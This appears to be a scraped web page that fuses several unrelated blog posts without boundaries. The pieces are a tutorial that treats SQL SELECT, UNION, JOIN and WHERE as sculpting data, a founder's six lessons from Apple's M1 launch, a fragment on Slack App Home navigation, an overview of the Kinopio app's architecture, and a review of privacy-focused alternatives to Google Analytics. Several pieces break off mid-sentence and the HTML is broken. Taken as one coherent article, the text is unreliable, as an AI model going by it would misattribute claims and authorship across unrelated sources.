Eventually, a sense of perfection overtakes you and you jubilantly bellow:  
</p>

<h3><em>Finis!</em></h3>



<p>
This carving - painstaking craftsmanship - is sometimes described as finding (or even freeing) the fully formed sculpture that is hidden within (that inherently exists in) the material.  
On the one hand, that's an <em>amazing</em> way to think about carving a sculpture.  
On the other hand, it depresses me - because I lack such insight, myself.  
</p>

<p>
Or... maybe I don't.  Maybe I only lack it in an artistic context.  
</p>

<p>
What might it look like if we considered writing a SQL statement - a query, a SELECT statement - as an act of sculpting, of creating a sculpture?
</p>


<br>
<hr>
<br>
<h2>Assembling Your Data</h2>




<p>
The first thing you need to do in making... um... a... data sculpture... is to assemble your material.  
</p>

<p>
In SQL, your medium is sets of data.  
Note that I <em>did not</em> say that your medium is data.  I said that it is <em>sets</em> of data.  
That is an <em>essential</em> distinction that is lost on a lot of would be relational database users.  
</p>

<p>
A database is a set of tables.  
A table is a set of rows.  
A row is a set of fields (column values).  
A query (a SELECT statement) returns a result set.  That result set is structurally equivalent to a table - it is a set of zero or more rows, each of which is a set of one or more fields.
</p>

<p>
We can think of a table (a set of rows) as a block of data, sort of like a block of clay.  
In doing so, we're getting more abstract again.  But this time it helps us to build our intuition.
</p>



<p>
If you think of tables as blocks of data, then you can think of every SELECT statement as starting with an initial or primary block of data.  
Your primary block of data is the table that you name in the FROM clause.  
For example, here we retrieve all of the fields, in all of the rows, from a primary block of data (a table) named flashcards.  
</p>

<br>
<pre><code>SELECT * FROM flashcards;</code>
</pre>


<p>
Sometimes we need more than one block of data.  
This will be the case when our primary table does not have all of the data that we need - we need some of the rows, or some of the columns, from some other table(s).  
This poses two challenges:  
</p>

<ul>
<li>arranging the blocks (tables) sensibly</li>
<li>mushing the blocks (tables) together</li>
</ul>

<p>
But before we can do these things, we need to think about what the blocks might look like.
</p>

<p>
When we work with clay, we can expect that the blocks we mush together will all be of the same size and shape.  
If they're not, it really doesn't matter - because it's just clay.  
One blob of clay is (mostly) indistinguishable from any other.
</p>

<p>
When we work with data, though, we usually don't have that expectation.  
Most of the time, the other blocks (tables) we need are a different shape than our primary block.  
By the shape of a table, we mean the set of columns that define the table.  
If two tables are defined with the same set of columns, we can say that the tables are of the same shape.  
If they differ in any way, column-wise, we say that the tables are differently shaped.  
</p>


<br>
<h3>Arranging and Mushing Data Blocks of the Same Shape</h3>

<p>
When you have data blocks (tables) of the same shape, you can (you <em>must</em>) stack them on top of each other.  
You can do this because the columns align - each data block (table) has the same columns, in the same order, as all of the others.  
Each column in a data block can thus support its corresponding column in any data block(s) stacked above it.
</p>


<p>
Recall, as I said before, though, that a result set is equivalent to a table.  
That doesn't just mean that a result set <em>looks</em> like a table.  
It also means that we can <em>treat</em> a result set like a table.  
This is a <em>crucial</em> characteristic of result sets, because I wasn't quite precise in the last paragraph.  
You cannot actually stack <em>tables</em> on top of each other in a query.  
But you can stack <em>result sets</em>.  
And that gets us to the same place.  
</p>


<p>
We thus arrange and mush (stack) identically shaped data blocks (result sets) in what we call a union operation.  
We do this simply by inserting the UNION keyword in between two queries.  
</p>

<p>
For example, here we will stack a result set from querying a QA/staging table (flashcards_qa) below a result set from querying our primary (flashcards) table.  
</p>

<br>
<pre><code>SELECT * FROM flashcards
UNION 
SELECT * FROM flashcards_qa;</code>
</pre>


<p>
The UNION operator is used to stack two result sets, one on top of the other.  
It gathers together the rows returned by one query with those returned by another query, merging them all together into a single, larger result set.  
</p>

<p>
We can (we <em>should</em>) think of a UNION operation as adding more rows (but not more columns) to our primary block of data.  It makes the primary block taller (but not wider).
</p>

<p>
There's not much else to arranging and mushing together data blocks of the same shape.  
But you don't have to stop at two blocks.  
You can stack as many queries as you want, as long as the result set from each query is of the same shape - the same set of fields - as all of the others.
</p>



<br>
<h3>Arranging and Mushing Data Blocks of Different Shapes</h3>

<p>
When you have data blocks (tables) of different shapes, you cannot stack them on top of each other.
You cannot do so because their columns can't align.  
As such, your only option for arranging them is to lay them next to each other, side-by-side.
</p>

<p>
But we need to make one thing clear before we get to the how.  
Although these tables each have a different set of columns, they do have to have <em>at least one</em> column that is common between them - a column of the same semantic type (and the same data type).  
This is often an identifier field, such as a user_id number, or a purchase_id number.  But it could be anything - a date field, or even a text field.  
If the two tables do not have any common column(s) at all (one or more, of the same semantic type), <em>they cannot be mushed together</em>, under any circumstances.
</p>

<p>
Assuming we're good on that front, we arrange and mush differently shaped tables in what we call a table join operation.  
We append the JOIN keyword to our query's FROM clause, along with the name of the table we want to add columns from.  
Then we use the ON keyword to tell the DBMS how the tables are related.  
</p>

<p>
For example, here we will join the columns from a table named scores to those of our flashcards table.  
Both tables have a card_id field.
</p>

<br>
<pre><code>SELECT *
FROM flashcards
    JOIN scores
        ON flashcards.card_id = scores.card_id;</code>
</pre>


<p>
We can (we <em>should</em>) think of a table join operation as adding more columns to our primary block of data.  It makes our primary data block wider (but not taller).  
</p>

<p>
We're glossing over <em>a lot of detail</em> here.  
But the intuition is simple - laying one or more additional tables alongside your primary table.
</p>

<br>
<hr>
<br>
<h2>Carving Your Data</h2>


<p>
When it comes to carving your data block down to the size and shape you need, it should come as no surprise that you have two categories of choices.  
You can carve down the height of the block - the quantity of rows in the result set.  
Or you can carve down the width of the block - the quantity of fields (column values) in the result set.  
In most cases, you will do both.  
</p>

<p>
A reminder, though, that with the simplest query, we do neither.  
When we select * (an asterisk in the column list), we get all of the fields in the returned rows.  
When our query only includes the SELECT and FROM clauses, we get all of the rows returned from our table(s).  
So this query will retrieve all of the fields, in all of the rows, from our flashcards table:  
</p>

<br>
<pre><code>SELECT *
FROM flashcards;</code>
</pre>


<p>
To carve down the width of our data block - the quantity of fields in the result set - we simply name the columns we want - and only those columns - in the SELECT clause's column list:  
</p>

<br>
<pre><code>SELECT question FROM flashcards;
SELECT question, answer FROM flashcards;</code>
</pre>


<p>
When it comes to carving down the height of our data block - the quantity of rows in the result set - we have more than one tool at our disposal.  
</p>

<p>
The most important, and commonly used of these, is the WHERE clause.  
You can think of the WHERE clause as the multi-tool (e.g. Swiss Army knife) of carving instruments.  
You can use it to lop off huge chunks, or chip off little bits, from your block of data.  
</p>

<br>
<pre><code>SELECT * FROM flashcards WHERE author = 'Mike';
SELECT * FROM flashcards WHERE create_date &gt; '2020-09-01';
SELECT * FROM flashcards WHERE question like '%awesome%';</code>
</pre>


<p>
You can use it to make multiple cuts, all at the same time.  
</p>

<br>
<pre><code>SELECT * FROM flashcards
WHERE author = 'Mike'
    AND create_date &gt; '2020-09-01'
    AND question like '%awesome%';</code>
</pre>


<p>
The LIMIT clause is another commonly used row carving tool.  
It's not a very sophisticated tool, at least by itself.  
You can think of it as the kiddie scissors of carving tools.  
Here, we will retrieve only the first 25 rows from our flashcards table:  
</p>

<br>
<pre><code>SELECT * FROM flashcards
LIMIT 25;</code>
</pre>


<p>
The LIMIT clause is often used in combination with the OFFSET clause in order to take a slice from somewhere in the middle.  </p></div></div></div>

                <p>If you are a tech enthusiast, Apple has been very hard to miss. As a nerd, I look at Apple from a gadget perspective. But as a founder I look at them differently. Here are 6 lessons Apple can teach you about product development and marketing including one lesson you should not copy.</p>
<h2>1. Good architecture wins</h2>
<p>At its core, a MacBook as well as any other Apple computer, runs macOS. MacOS is based on the operating system Unix and a core called Darwin. Apple has made a very strong software architecture based on these components. That architecture is so strong that Apple is now able to switch out the very brain of the computer; both the processor/CPU and the language it speaks. The reason is that Apple has been making its own CPU for years for the iPhone. That CPU is so mature now that they feel a derivative of it will be better for the Macbooks as well. It also makes them independent of Intel. That is a big plus. Computer updates are usually directly linked to CPU updates and Apple is now completely free to run their own update cycles.</p>
<p>Apple once started with their own PowerPC CPU but 15 years ago they moved to Intel CPU’s because at that time, Intel was faster. Now, at the end of 2020, they introduced Apple Silicon, which will replace Intel because Intel can’t keep up anymore.</p>
<p>Swapping out a brain and the language it uses is a massive accomplishment. Apple did this twice; first from PowerPC to Intel and now from Intel to the Apple Silicon M1! The only reason they were able to do it was because of the good architecture their computers are built on.</p>
<p>Good architecture wins.</p>
<h2>2. Let your products share and borrow from each other</h2>
<p>The Darwin core we just talked about? It’s not just the core for MacOS. It’s also the core for iOS (iPhones), WatchOS (Apple Watches), tvOS (for Apple TV), and iPadOS (for the iPad).</p>
<p>The foundation of everything Apple builds is shared between these products. And it goes even further. A derivative of the brain used in an iPhone is now also used in that new MacBook Apple just announced. This means the chips Apple develops are built on a similar platform as well.</p>
<p>With the same hardware and the same software, you can also use the same code. That’s why it is so easy to develop for the iOS family of devices; there are so many similarities. That’s also the reason iPad/iPhone apps will work on your new MacBook, making apps device-agnostic.</p>
<p>This is a major plus for any developer, both internally and externally, writing programs or building hardware for the Apple family. If you share hardware and software in multiple products, you can move way faster.</p>
<h2>3. Be incomparable</h2>
<p>The announcement event unveiling the new Apple processors was a bit of a bummer for the hardcore nerd. Where chipmaker AMD will compare itself to Intel – which gives you a reference on how good they are – Apple does nothing like that.</p>
<p>Apple uses phrases like “Up to twice as fast as the latest notebook chips” or “Faster than 98% of PCs on the market” or “World’s fastest CPU performance per watt.”</p>

<p><img src="https://wearespindle.com/wp-content/uploads/2020/11/m1-CPU-performance-per-watt-1024x576.png" alt="" width="100%" srcset="https://wearespindle.com/wp-content/uploads/2020/11/m1-CPU-performance-per-watt-1024x576.png 1024w, https://wearespindle.com/wp-content/uploads/2020/11/m1-CPU-performance-per-watt-300x169.png 300w, https://wearespindle.com/wp-content/uploads/2020/11/m1-CPU-performance-per-watt-768x432.png 768w, https://wearespindle.com/wp-content/uploads/2020/11/m1-CPU-performance-per-watt-1536x864.png 1536w, https://wearespindle.com/wp-content/uploads/2020/11/m1-CPU-performance-per-watt-2048x1152.png 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></p>
<p><em>The nerd in me would like to know which latest laptop PC chip they are comparing the M1 to</em></p>

<p>If you are not clear about how you are measuring something, it’s an empty statement. But it’s only empty for me as a nerd. It’s not empty for their target audience and their market! Apple understands that their target consumer simply does not care about these detailed technical benchmarks.</p>
<p>The Apple customer hears: “Ha, you see, my brand is better than your Windows machine, I made the right choice”.</p>
<p>The Windows user hears: “Damn, Apple made something way faster than my Windows machine, I should be switching.”</p>
<p>The intro song <em>Tones and I – Fly Away</em> used for the “<a href="https://www.apple.com/apple-events/november-2020/">One More Thing</a>” event where the new MacBooks and processor were announced, even starts with the lyrics “I don’t want to be like them”.</p>
<p>It’s not about specs for Apple, it’s about bringing a sense of awe to their target audience, which makes them incomparable.</p>
<h2>4. Market everything by giving it a name</h2>
<p>The incomparable part is pure marketing, and it’s where Apple shines. They simply brand everything.</p>
<p>An Apple watch does not have a button; it has a <em>Digital Crown</em>.</p>
<p>Apple does not make processors, it makes <em>Apple Silicon</em>.</p>
<p>The new chip does not have a core for machine learning, it has a <em>Neural Engine</em>.</p>

<p><img src="https://wearespindle.com/wp-content/uploads/2020/11/apple-watch-digital-crown-1024x683.jpg" alt="" width="100%" srcset="https://wearespindle.com/wp-content/uploads/2020/11/apple-watch-digital-crown-1024x683.jpg 1024w, https://wearespindle.com/wp-content/uploads/2020/11/apple-watch-digital-crown-300x200.jpg 300w, https://wearespindle.com/wp-content/uploads/2020/11/apple-watch-digital-crown-768x512.jpg 768w, https://wearespindle.com/wp-content/uploads/2020/11/apple-watch-digital-crown-1536x1024.jpg 1536w, https://wearespindle.com/wp-content/uploads/2020/11/apple-watch-digital-crown-2048x1365.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></p>
<p><em>An Apple watch does not have a button, it has a digital crown</em></p>

<p>It all feels special. It all feels unique. And it makes you feel like you need the product or the upgrade.</p>
<p>So, if you build a cool new product feature, put some effort in your feature branding as well. And, as we can learn from Apple, this starts with a cool name for each feature.</p>
<h2>5. Optimize for total chain control</h2>
<p>Apple can claim the new processor is x-times as fast because they don’t just control the hardware, they control the software as well. And that software is completely optimized for the hardware. The fact that 3rd party software still needs to be optimized for the hardware gives Apple an edge over 3rd parties as well. If Safari is faster and uses less battery than Chrome there is an extra reason to use Safari. If Final Cut Pro runs better than Adobe Premiere a user will choose Final Cut Pro.</p>
<p>This goes even further in the Apple Store used on iPhone and iPad devices. Apple does not just control the store. They control the hardware, the software, the store, and the software distribution channels. They even control their proprietary connector and the <a href="https://en.wikipedia.org/wiki/MFi_Program">devices that are allowed to use it</a>. They also control the <a href="https://www.ifixit.com/News/43008/apple-emails-reveal-internal-debate-on-right-to-repair">repair channels</a>.</p>
<p>You could even say they <a href="https://www.timetoplayfair.com/">abuse</a> <a href="https://www.theverge.com/2020/8/13/21366259/epic-fortnite-vbucks-mega-drop-discount-iphone-android">this</a> <a href="https://www.theguardian.com/environment/2017/mar/06/nebraska-farmers-right-to-repair-john-deere-apple">power</a>.</p>
<p>However you look at it, it makes Apple mighty successful and independent.</p>
<h2>6. Don’t be afraid to make radical decisions (that hurt customers)</h2>
<p>This one is the toughest to swallow. Switching processors is a radical decision which benefits the customers in the long run. These decisions are brave and should be celebrated.</p>
<p>On the other hand, Apple often makes decisions that directly affect customers in a negative way.</p>
<p>The new M1 chips have everything – even memory – built into the chip. That makes the chip very fast and efficient, but you won’t be able to upgrade memory anymore.</p>
<p>Apple can bring out new devices with just two small USB-C ports (their new laptops). Which means you have to buy dongles (Apple multiport $69,-). Apple can ditch the so-widely-used 3,5mm jack port on the iPhone. Which means you have to buy Apple headphones, preferably the expensive bluetooth ones (Apple AirPods Pro $249). Apple can keep a lightning port on the iPhone, whereas the entire smartphone world is going USB-C, which means you have to replace the cable and it creates a vendor lock for accessories. And yes, you have to buy those cables again and again because they are flimsy and break all the time (USB-C to Lightning Cable (1 m) $19).</p>

<p><img src="https://wearespindle.com/wp-content/uploads/2020/11/another-broken-apple-cable-1024x437.jpg" alt="" width="100%" srcset="https://wearespindle.com/wp-content/uploads/2020/11/another-broken-apple-cable-1024x437.jpg 1024w, https://wearespindle.com/wp-content/uploads/2020/11/another-broken-apple-cable-300x128.jpg 300w, https://wearespindle.com/wp-content/uploads/2020/11/another-broken-apple-cable-768x327.jpg 768w, https://wearespindle.com/wp-content/uploads/2020/11/another-broken-apple-cable.jpg 1400w" sizes="(max-width: 1024px) 100vw, 1024px"></p>
<p><em>The environment would really benefit from cables that don’t break within 6 months</em></p>

<p>They can even ditch a charger – where the new cables they supply with your phone are not even compatible with the existing iPhone chargers – so people have to buy a power brick (Apple 20w brick $19).</p>
<p>The reasoning here is very simple. No, it’s not innovation and it’s not the <a href="https://www.theverge.com/2020/10/16/21519466/apple-iphone-12-chargers-airpods-greenhouse-gas-emissions-e-waste">not the planet</a>. It is money. Apple is a shareholder-owned <a href="https://www.kevinrooke.com/post/apple-airpods-iphone-accessory-or-the-next-big-thing">money machine</a>. And this is the one thing I would ask you not to copy. Be there for your customers and the people you work with first, and let money be a by-product of doing the right stuff right.</p>
<h2>Changing the game for better or worse</h2>
<p>Apple’s product launches have become a fall tradition. Every year we wait for them, and wait to see not only what innovative products they are introducing, but also how they are changing the game. For tech enthusiasts and entrepreneurs alike, any big company has multiple examples of what-to-do and what-not-to-do. But Apple is in a league of its own. Whether you love the brand or think they represent everything that’s wrong with the world, Apple is a force to learn from.</p>

Slack’s App Home makes it easier than ever to create high-quality user interfaces by borrowing familiar elements from the web.</p><p>For a good experience, users need to be able to navigate smoothly throughout your app.  If they can't get to the important feature you just added without getting frustrated, it wasn’t worth building. Let’s take a look at some of the common patterns for navigation and how to apply them to Slack. These design elements reveal only a single area of content at a time, simplifying the user journey in your app. To demonstrate each style of navigation, we will start with a template provided by Slack and then modify it. Each section will have a <a href="https://app.slack.com/block-kit-builder">Block Kit Builder</a> link so you can try it out yourself.

This style is good for apps that only have a small number of sections as too many buttons (tabs) can appear unwieldy. A possible workaround would be combining tabs with the next idea, modal navigation.  Limit your tabs to just the most crucial, then make a <em>'More Options'</em> tab to show all sections in a modal.  Another alternative is to use buttons for the top sections and an overflow menu for those that remain.</p><p><img src="https://happybara.io/wp-content/uploads/2020/09/app-home-nav-tabs.jpg" data-src="https://happybara.io/wp-content/uploads/2020/09/app-home-nav-tabs.jpg" alt="app home tab navigation"></p><h2>Modal Navigation</h2><p><a href="https://app.slack.com/block-kit-builder/#%7B%22title%22:%7B%22type%22:%22plain_text%22,%22text%22:%22App%20Menu%22,%22emoji%22:true%7D,%22submit%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Submit%22,%22emoji%22:true%7D,%22type%22:%22modal%22,%22close%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Cancel%22,%22emoji%22:true%7D,%22blocks%22:%5B%7B%22type%22:%22section%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22%20%22%7D,%22accessory%22:%7B%22type%22:%22radio_buttons%22,%22initial_option%22:%7B%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Home%22%7D,%22value%22:%22option%201%22,%22description%22:%7B%22type%22:%22plain_text%22,%22text%22:%22%20%20%22%7D%7D,%22options%22:%5B%7B%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Home%22%7D,%22value%22:%22option%201%22,%22description%22:%7B%22type%22:%22plain_text%22,%22text%22:%22%20%20%22%7D%7D,%7B%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Approvals%22%7D,%22value%22:%22option%202%22,%22description%22:%7B%22type%22:%22plain_text%22,%22text%22:%22History%20of%20approvals%22%7D%7D,%7B%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22All%20Expenses%22%7D,%22value%22:%22all_expenses%22,%22description%22:%7B%22type%22:%22plain_text%22,%22text%22:%22View%20details%20and%20approve%20all%20expenses%22%7D%7D,%7B%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Settings%22%7D,%22value%22:%22Settings%22,%22description%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Change%20your%20settings%22%7D%7D%5D%7D%7D,%7B%22type%22:%22divider%22%7D,%7B%22type%22:%22section%22,%22text%22:%7B%22type%22:%22mrkdwn%22,%22text%22:%22*_Get%20in%20touch:_*%22%7D,%22fields%22:%5B%7B%22type%22:%22mrkdwn%22,%22text%22:%22_%3Chttps://happybara.io%7C:writing_hand:%20Blog%3E_%22%7D,%7B%22type%22:%22mrkdwn%22,%22text%22:%22_%3Chttps://twitter.com/happybara_io%7C:woman:%20Facebook%3E_%22%7D,%7B%22type%22:%22mrkdwn%22,%22text%22:%22_%3Chttps://happybara.io%7C:camera:%20Instagram%3E_%22%7D,%7B%22type%22:%22mrkdwn%22,%22text%22:%22_%3Chttps://twitter.com/happybara_io%7C:bird:%20Twitter%3E_%22%7D%5D,%22accessory%22:%7B%22type%22:%22image%22,%22image_url%22:%22https://s3.happybara.io/pool-bara-square.png%22,%22alt_text%22:%22plants%22%7D%7D%5D%7D">Open in Block Kit Builder</a></p><p>To approximate drawer navigation from the web, pop a modal from a button.

    <p>You’ve probably heard, or lived, a story that goes like this…</p>

<blockquote>
  <p>I’m tired of <a href="https://pketh.org/why-software-is-slow-and-shitty.html">technology</a>. I’m leaving to do something <em>real</em> like sculpt clay, work wood, herd sheep, and grow vegetables.</p>
</blockquote>

<p>But making software that runs fast, efficiently, and reliably is it’s own kind of  craft, tangible in its own way. But, to do any kind of craft you have to understand the materials of your medium, how they bend, and how to work together.</p>

<p>Making an aircraft engine requires an understanding of the tolerances and capabilities of different metals, airflow and combustion. Not that I know anything about all that – our engine is made of state, localStorage, API, and websockets.</p>

<ul>
  <li><code>kinopio-client</code> is a Vue.js app that weighs 150 KB. When you go to <a href="https://kinopio.club/">https://kinopio.club</a>, it’s downloaded and run in your browser. This is the only part of Kinopio you use if you don’t have an account.</li>
  <li><code>kinopio-server</code> is a Node.js app that runs on a server out in the world. If you’re signed in, it saves your data to a database so that you can share, collaborate, and access your spaces on other devices.</li>
</ul>

<p><img src="https://pketh.org/images/2020/architecture.png"></p>

<p><img src="https://pketh.org/images/2020/desktop-computer.gif"></p>

<ul>
  <li>Speed first, perfect later. You shouldn’t need to wait for server requests to complete before editing your spaces. Because <a href="https://craigmod.com/essays/fast_software/">fast software is the best software</a>.</li>
  <li>Favor easy maintenance. To help you sleep at night choose open technologies that are widely supported and well documented.</li>
  <li>Building a foundation for decades. This mindset encourages me to write small, simple code that is easy to re-read in the future. If I’m adding a third-party library to Kinopio, that’s now a commitment over years so I’m motivated to really know what I’m adding – and maybe write it myself instead if that’s the smaller and faster option.</li>
</ul>



<h2 id="state">State</h2>

<p><strong>State</strong> is your current space and user data, which informs the display of elements on the page. E.g. my <code>user.name = 'Pirijan'</code> and my <code>user.color = 'cyan'</code>. Kinopio uses Vue.js/Vuex to bind data to elements on the page. So when you change your <code>user.color</code>, everything that references that user’s color updates.</p>


<figure>
  <figcaption>

  </figcaption>
</figure>

<p>State is not persistent though, unless it’s saved somewhere it’ll be lost the next time you refresh.</p>

<h2 id="localstorage">LocalStorage</h2>

<p><strong>LocalStorage</strong> is 2-5 MBs of key-value data that every website gets to save on your device. Unlike cookies, localStorage data can only be accessed by the URL that created it which means it’s secure and can’t be used for user tracking and other shady shit.</p>

<p>Here’s a secret, by stringifying JSON objects you can save any kind of data structure to it. LocalStorage is fragile though, you can accidentally wipe it out by clearing your browser cache.</p>

<h2 id="api-and-database">API and Database</h2>

<p>The Kinopio <strong>API</strong> is used to <code>GET</code> and <code>POST</code>(save) data to the database so that you can edit your spaces on other devices. Getting data from servers is much slower than getting data from your localStorage, because of the round-trip and because every request needs to be privacy authorized.</p>

<p><img src="https://pketh.org/images/2020/api-docs.png"></p>
<figure>
  <figcaption>
<a href="https://help.kinopio.club/api">Kinopio API Docs</a> are  also public so that developers can make custom integrations and tools
  </figcaption>
</figure>

<h2 id="websockets">Websockets</h2>

<p><strong>Websockets</strong> create that magical collaboration feeling by enabling a real-time stream of messages to be sent and received by a client, e.g. <code>Pirijan moved cardId ABC123 to position {x: 100, y: 200}</code>. These messages are relayed by the server to collaborators whose space state is updated. e.g. updating the position of the card.</p>

<p>Websocket connections must be actively kept alive with a ‘heartbeat’ exchange. If you go afk for a while, like to make a coffee or something, reconnecting to the stream takes a couple seconds.</p>

</table>

<p>When you load Kinopio for the first time, your state is created and saved to localStorage so it can be restored. When you update your state by editing cards or connections, localStorage is also updated. Once you sign up, updates also save to the API.</p>

<p>Once you start using Kinopio on other devices, the localStorage on your phone might be ahead of the one on your computer.</p>

<p>To be fast, Kinopio first restores state from possibly outdated localStorage. Once the latest server data is downloaded, the state is re-restored.</p>

<p>While the space is downloading from the server, edits you make are saved and then applied on top of the server copy.</p>

<figure>

  Edits you make to your space while the server data is downloading are recorded and applied to it

</figure>

<p>Websockets only stream relayed updates to connected collaborators and spectators. You might be wondering, why don’t you just update the database with websockets instead of relatively slow API requests?</p>

<p>The problem with saving data with websockets is that they’re <em>too</em> fast. Authenticating that many messages per second and writing them to disk would be really inefficient. E.g. If you’re moving a card from position <code>x: 20</code> to <code>x: 420</code>, Kinopio will use websockets to broadcast many updates during the move: <code>moving card x to 21</code>, <code>moving card x to 24</code>, <code>moving card x to 28</code>… potentially hundreds of messages. Or you could send a single API request after you’ve moved the card, <code>PATCH card.x = 420</code>.</p>

<p><img src="https://pketh.org/images/2020/cappuccino.png"></p>

<p>Building fast, easy to maintain software that’ll hopefully last for decades means understanding and using the right technology for the right job. It’s its own kind of craft, in its own kind of way.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I tried out many analytics SaaS on my blog to find a great alternative for my tracking needs. I was using Google Analytics before, but now I want to use something that cares about my and other user's privacy.</p><p>My feature requests are very simple:</p><ul><li>tracks page views without using cookies</li><li>privacy-focused</li><li>can track events</li><li>offers a way to use a custom domain to deny ad blockers</li><li>(optional) possibility to share the dashboard via a link</li></ul><p>Most alternatives I found offer (most of) those features and even more. Before going over each alternative, I want to talk about why you might want to get rid of Google Analytics.</p><h2>Why you should not use Google Analytics</h2><p><strong>Privacy.</strong> Google Analytics is a free service from Google. When something is free, you probably will be paying with something else. In Google's case, you will be paying with the data that you collect for them. Google is a big ad company that generates money by using your data. So this is one big reason not to use Google Analytics. I try to reduce my services that depend on Google and I always look for alternatives. <a target="_blank" rel="noopener noreferrer" href="https://twitter.com/levelsio">Pieter Levels</a> created a website where you can find alternatives for Google services called <a target="_blank" rel="noopener noreferrer" href="https://nomoregoogle.com/">No More Google</a>.</p><p><strong>Cookies.</strong> Another reason why you might not want to use Google Analytics is that you will have to show those ugly cookie banners. If you are using services that put cookies on your site you will have to show those cookie banners to stay GDPR compliant. You will also have to put in place the option to opt-out of it and have a policy page. It's not that difficult to implement, but you could skip it.</p><p><strong>Complex Dashboard.</strong> Google Analytics is way more than just tracking pageviews, therefore it has lots of features and the dashboard is not that easy to use. If you only want to track page views and maybe some events then I think Google Analytics is overkill for your use case.</p><p><strong>Ad-Blockers.</strong> If you use Google Analytics you will not track all page views, because of the well-known domain name that it is blocked by most ad blockers. With other services, you can use a custom domain that is not blocked by ad blockers and you will get way more analytics data.</p><hr><p>In the next sections, I want to give you an overview of 6 different analytics services that I can recommend without blinking an eye. Some of them are free to use and open-source, others will require a subscription.</p><h2>Plausible Analytics</h2><p><a target="_blank" rel="noopener noreferrer" href="https://plausible.io/">https://plausible.io/</a></p><blockquote><p>Simple and privacy-friendly alternative to Google Analytics</p></blockquote><p>Plausible Analytics is one of my favorite Analytics services I have used.</p><p>The UI is very modern and clean, it is privacy-friendly, can track multiple websites in one account, you can <a target="_blank" rel="noopener noreferrer" href="https://docs.plausible.io/self-hosting/">self-host</a> it because it is <a target="_blank" rel="noopener noreferrer" href="https://github.com/plausible/analytics">open source</a>, it allows the use of custom domains, sends you weekly or monthly reports and much more.</p><p><img src="https://images.ctfassets.net/hb3id6ag4raq/tClWlK2Wk8YxnZzelQq3l/dad4d975b556a1702daa15e0c7ff0c82/Screenshot_2020-11-04_at_21.10.14.png" alt="Plausible Analytics 7-days"></p><p>It ticks almost every checkbox of the features I need and if it is not currently implemented it will be soon. Plausible Analytics is working on more features and they have a <a target="_blank" rel="noopener noreferrer" href="https://github.com/plausible/analytics/projects/1">public roadmap</a> where you can see what will be added next!</p><p>I like to host services myself therefore I love that Plausible is open source and that I can host it myself. Of course, with self-hosting, I need to take care that the server is always online and the database is backed up regularly.</p><p>If I don't want to do that, I can let Plausible take care of it for a very fair price depending on the amount of traffic you have. They even offer a free trial of 30 days without requiring a credit card.</p><h2>Fathom</h2><p><a target="_blank" rel="noopener noreferrer" href="https://usefathom.com/ref/SAJGHU">https://usefathom.com/</a> (affiliate link)</p><blockquote><p>Your website analytics should be simple, fast and privacy-focused</p></blockquote><p>Fathom is one of the first analytics SaaS that focused on privacy.</p><p>It offers a clean and easy to use dashboard with only the information that you will need. You can use your Fathom account for multiple websites, the pricing is fair, you can use custom domains and you can track events by creating goals.</p><p><img src="https://images.ctfassets.net/hb3id6ag4raq/7EEZoLbMU6NmsGnoJvykT8/81839ba5790494c6a95a1c5d4cd7d056/Screenshot_2020-11-04_at_21.08.19.png" alt="Fathom 7-days"></p><p>They are currently working on new branding and <a target="_blank" rel="noopener noreferrer" href="https://twitter.com/usefathom/status/1319310149647937536">as it looks like</a> a new dashboard with additional features like API access.</p><p>Additional to analytics Fathom also provides website monitoring. You can get notified if your website ever goes offline and that is included with your account for FREE!</p><p>Recently Fathom published the <a target="_blank" rel="noopener noreferrer" href="https://usephantom.com/">Phantom Analyzer</a>. A simple tool where you can check if a site is using some shady trackers or if your site is trackers free.</p><p><img src="https://images.ctfassets.net/hb3id6ag4raq/1bE9MaSnfSxFWH7iuJYcj2/73d40052d493ad36b741bb10b059de96/Screenshot_2020-11-04_at_21.48.43.png" alt="Phantom Analyzer"></p><p>If you care about privacy then I would suggest that you check out Fathom. They offer 7 days free trial and if you decide to delete your account, they make sure that your data is gone for good!</p><h2>Umami</h2><p><a target="_blank" rel="noopener noreferrer" href="https://umami.is/">https://umami.is/</a></p><blockquote><p>own your website analytics</p></blockquote><p>Umami is an open-source alternative to Google Analytics developed by <a target="_blank" rel="noopener noreferrer" href="https://twitter.com/caozilla">Mike Cao</a> that you can host yourself.</p><p>Umami offers simple page and event tracking with a beautiful minimalistic UI. You can add as many websites as you like. Create a shareable link for the analytics and see real-time visitors.</p><p><img src="https://images.ctfassets.net/hb3id6ag4raq/6m0v9HixM56yBOeWhgSP9P/5eef4d612538564bc4e7bf7ccd7288ae/Screenshot_2020-11-04_at_21.10.39.png" alt="Umami 7-days"></p><p>I like how simple and clean the dashboard from Umami is.  New features and improvements are added regularly. Hosting is very easy too and documented well!</p><p>Hosting the analytics service yourself will allow you full control of the data that is tracked of your visitors. As I already said if tracking data is critical for you, you should probably invest some time into setting up some backup strategies. Therefore Umami is "free", but you will have to pay with your own time and stress I guess 😅</p><h2>Simple Analytics</h2><p><a target="_blank" rel="noopener noreferrer" href="https://referral.simpleanalytics.com/phiilu">https://simpleanalytics.com/</a> (affiliate link)</p><blockquote><p>Simple, clean, and friendly analytics</p></blockquote><p>I found Simple Analytics via Twitter and thought I might check it out too.</p><p>Simple Analytics offers privacy-friendly analytics that won't sell your data. It has a strong focus on being privacy-friendly and <a target="_blank" rel="noopener noreferrer" href="https://docs.simpleanalytics.com/what-we-collect?ref=simpleanalytics.com">transparent</a> with what it will track and store.

<p><img src="https://jordan-wright.com/blog/images/headers/svg/ossmalware.svg" alt="">
<br>
